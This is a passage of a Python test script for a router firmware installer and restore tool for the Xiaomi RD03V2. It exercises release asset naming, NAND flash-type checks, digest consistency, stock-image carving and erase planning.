    _f, err = _preflight(_ReplayShell(missing_tool="ubiformat"))
    check("missing ubiformat refused", err is not None and "ubiformat" in str(err))

    # wrapped df line: BusyBox puts a long device name on its own line
    facts, err = _preflight(_ReplayShell(df="   93332  1216  92116   1% /tmp"))
    check("wrapped df line still parses", err is None, str(err)[:80])

    check("flash_type table covers both documented parts",
          devices.RD03V2.flash_types["11"] == "ESMT F50D1G41LB"
          and devices.RD03V2.flash_types["be"] == "Winbond W25N01KW")


# ---- 8. v1.7: the -wifi variants and the release's own NAND declaration -----

V17_ASSETS = [
    "initramfs-factory.ubi", "initramfs-factory-wifi.ubi",
    "initramfs-factory-nss.ubi", "initramfs-factory-nss-wifi.ubi",
    "initramfs-uImage.itb", "initramfs-uImage-wifi.itb",
    "initramfs-uImage-nss.itb", "initramfs-uImage-nss-wifi.itb",
    "squashfs-sysupgrade.bin", "squashfs-sysupgrade-nss.bin",
    "squashfs-factory.ubi", "squashfs-factory-nss.ubi",
    "kmods.tar.gz", "kmods-nss.tar.gz",
]


def _v17_release(with_nand_file=True):
    """A v1.7 Release whose asset names are the ones actually published."""
    assets = [{"name": f"{devices.RD03V2.release_prefix}-{n}", "browser_download_url": "http://x/",
               "size": 1} for n in V17_ASSETS]
    assets.append({"name": "sha256sums.txt", "browser_download_url": "http://x/",
                   "size": 1})
    if with_nand_file:
        assets.append({
            "name": "nand-support.txt", "browser_download_url": "http://x/",
            "size": os.path.getsize("testdata/nand-support-v1.7.txt")})
    return release.Release({"tag_name": "v1.7", "published_at": "2026-08-14T16:48:40Z",
                            "assets": assets})


def test_v17_names():
    print("\n== v1.7 asset naming ==")
    rel = _v17_release()
    cases = [
        ("initramfs_itb", "default", False, "initramfs-uImage.itb"),
        ("initramfs_itb", "default", True, "initramfs-uImage-wifi.itb"),
        ("initramfs_itb", "nss", False, "initramfs-uImage-nss.itb"),
        ("initramfs_itb", "nss", True, "initramfs-uImage-nss-wifi.itb"),
        ("initramfs_ubi", "nss", True, "initramfs-factory-nss-wifi.ubi"),
        ("sysupgrade", "nss", False, "squashfs-sysupgrade-nss.bin"),
    ]
    for kind, flav, wifi, tail in cases:
        got = rel.name_for(kind, flav, wifi)
        want = f"{devices.RD03V2.release_prefix}-{tail}"
        check(f"{kind}/{flav}{'/wifi' if wifi else ''} -> {tail}", got == want, got)
        # and it must be an asset that actually exists in the release
        check(f"  {tail} is published", got in rel.assets)

    try:
        rel.name_for("sysupgrade", "default", True)
        check("sysupgrade has no -wifi twin", False)
    except release.ReleaseError as e:
        check("sysupgrade has no -wifi twin", "no -wifi variant" in str(e))


def test_v17_nand_support():
    print("\n== v1.7 nand-support.txt ==")
    d = tempfile.mkdtemp(prefix="rd03v2-nand-")
    try:
        rel = _v17_release()
        tagged = release.cache_dir(rel, d)
        os.makedirs(tagged)
        shutil.copy("testdata/nand-support-v1.7.txt",
                    os.path.join(tagged, "nand-support.txt"))
        # download() short-circuits on a present file of the declared size, so
        # this parses the real published asset with no network.
        table = release.nand_support(rel, d)
        check("real nand-support.txt parses", isinstance(table, dict) and table,
              f"{len(table or {})} entries")
        check("only bootloader-identifiable parts are offered",
              len(table) == 12, str(len(table)))
        check("'-' rows are dropped", "-" not in table)
        check("ESMT keyed on its flash_type byte",
              "ESMT F50D1G41LB" in table.get("11", ""), table.get("11"))
        check("Winbond KW keyed on its flash_type byte",
              "W25N01KW" in table.get("be", ""), table.get("be"))

        ok, why = release.check_nand(rel, None, d, flash_type="be")
        check("v1.7 accepts a Winbond unit by flash_type", ok, why)
        ok, why = release.check_nand(rel, None, d, flash_type="0x11")
        check("0x-prefixed flash_type normalises", ok, why)
        ok, why = release.check_nand(rel, None, d, flash_type="77")
        check("an undeclared flash_type is refused", not ok, why[:70])
        ok, why = release.check_nand(rel, "ESMT F50D1G41LB", d)
        check("part-name fallback still works when no byte is known", ok, why)

        # the release, not the local version table, is the authority
        ok, why = release.check_nand(rel, "Winbond W25N01KW", d)
        check("release declaration outranks the local version table", ok, why)
        no_file = _v17_release(with_nand_file=False)
        ok, why = release.check_nand(no_file, "Winbond W25N01KW", d)
        check("without the asset it falls back to the version table",
              ok and "v1.7" in why, why[:60])
    finally:
        shutil.rmtree(d, ignore_errors=True)


def test_release_integrity():
    print("\n== release cache and integrity ==")
    one = release.Release({"tag_name": "v1.10", "assets": []})
    two = release.Release({"tag_name": "v1.11", "assets": []})
    check("release cache is tag-scoped",
          release.cache_dir(one, "images") != release.cache_dir(two, "images"))

    digest = "a" * 64
    rel = release.Release({
        "tag_name": "v1.11",
        "assets": [{"name": "image.bin", "browser_download_url": "http://x/",
                    "size": 1, "digest": f"sha256:{digest}"}],
    })
    check("matching manifest and GitHub digests are accepted",
          release.expected_digest(rel, "image.bin", digest) == digest)
    try:
        release.expected_digest(rel, "image.bin", "b" * 64)
        check("conflicting release digests fail closed", False)
    except release.ReleaseError as exc:
        check("conflicting release digests fail closed",
              "internally inconsistent" in str(exc))


def test_tagged_revert_cache():
    import revert
    print("\n== tagged revert cache ==")
    root = tempfile.mkdtemp(prefix="xiaomi-revert-cache-")
    try:
        tagged = os.path.join(root, "v1.11")
        os.makedirs(tagged)
        ubi = os.path.join(tagged, "test-initramfs-factory-wifi.ubi")
        itb = os.path.join(tagged, "test-initramfs-uImage-wifi.itb")
        open(ubi, "wb").close()
        open(itb, "wb").close()
        got_ubi, got_itb = revert.find_ram_images(root, "v1.11")
        check("revert finds the selected release's image pair",
              got_ubi == ubi and got_itb == itb)
    finally:
        shutil.rmtree(root, ignore_errors=True)


def test_stock_image():
    """Carve and validate the real Xiaomi image, if it is present."""
    import glob
    cand = glob.glob("/home/agiu/ax3000t-firmware/miwifi_rd03v2_*.bin")
    if not cand:
        return
    import restore
    print("\n== stock image carve ==")
    profile = devices.RD03V2
    payload, digest, known = restore.carve(cand[0], profile)
    check("hash is a published one", bool(known), str(known))
    check("payload is a whole number of PEBs",
          len(payload) % profile.peb_size == 0)
    img = restore.inspect(payload, profile)
    names = {v.name for v in img.volumes.values() if v.lebs}
    check("carries kernel + ubi_rootfs", names == {"kernel", "ubi_rootfs"}, str(names))
    check("single UBI", len(img.image_seqs) == 1)
    check("fits stock slot 0", len(payload) <= profile.stock_slot0[1])

    # the erase plan must cover exactly what is above stock's slot 0
    mtd = {
        "ubi_kernel": {"index": 18,
                       "size": profile.openwrt_partitions["ubi_kernel"][1]},
        "rootfs": {"index": 19,
                   "size": profile.openwrt_partitions["rootfs"][1]},
    }
    pl = restore.plan(mtd, profile)
    _k, tail_off, tail_cnt = pl["erase_tail"]
    abs_start = profile.openwrt_partitions["ubi_kernel"][0] + tail_off
    check("tail erase starts exactly at stock slot 1",
          abs_start == profile.stock_slot0[0] + profile.stock_slot0[1],
          hex(abs_start))
    check("tail erase runs to the end of ubi_kernel",
          tail_off + tail_cnt * profile.peb_size
          == profile.openwrt_partitions["ubi_kernel"][1])
    check("rootfs erase covers the whole partition",
          pl["erase_rootfs"][2] * profile.peb_size
          == profile.openwrt_partitions["rootfs"][1])

    bad = b"XXXX" + payload[4:]
    try:
        restore.carve.__wrapped__ if False else None
        import tempfile, os as _os
        with tempfile.NamedTemporaryFile("wb", suffix=".bin", delete=False) as fh:
            fh.write(bad); bp = fh.name
        try:
            restore.carve(bp, profile); check("non-HDR1 refused", False)
        except restore.RestoreError as e:
            check("non-HDR1 refused", "HDR1" in str(e))
        finally:
            _os.unlink(bp)
    except Exception as e:
        check("non-HDR1 refused", False, str(e))


def test_expected_volume():
    d = os.environ.get("RD03V2_IMAGES")
    if not d or not os.path.isdir(d):
        return
    import glob
    import install
    print("\n== installer read-back expectation ==")
    ubi = glob.glob(os.path.join(d, "*initramfs-factory.ubi"))
    itb = glob.glob(os.path.join(d, "*initramfs-uImage.itb"))
    if not (ubi and itb):
        return
    blob, md5 = install.expected_volume(ubi[0], itb[0])
    check("expected volume derived from the real pair", len(blob) == 13967360,
          str(len(blob)))
    check("it is the .itb plus 0xff padding",
          blob.startswith(open(itb[0], "rb").read())
          and set(blob[os.path.getsize(itb[0]):]) == {0xFF})
    check("md5 is of the padded volume, not the .itb",
          md5 == hashlib.md5(blob).hexdigest()
          and md5 != hashlib.md5(open(itb[0], "rb").read()).hexdigest())


def main():
    t0 = time.time()
    test_profiles()
    test_simple_installer_cli()
    test_stager()
    test_ubi()
    test_ubi_live_hazards()
    test_readback_match()
    test_real_artifact()
    test_parsers()
    test_protocol()
    test_http_flow()
    test_facts_commands()
    test_pull_fallback()
    test_installer_preflight()
    test_v17_names()
    test_v17_nand_support()
    test_release_integrity()
    test_tagged_revert_cache()
    test_stock_image()
    test_expected_volume()
    test_channel()
    print(f"\n{len(PASS)} passed, {len(FAIL)} failed in {time.time() - t0:.1f}s")
    if FAIL:
        print("failed: " + ", ".join(FAIL))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
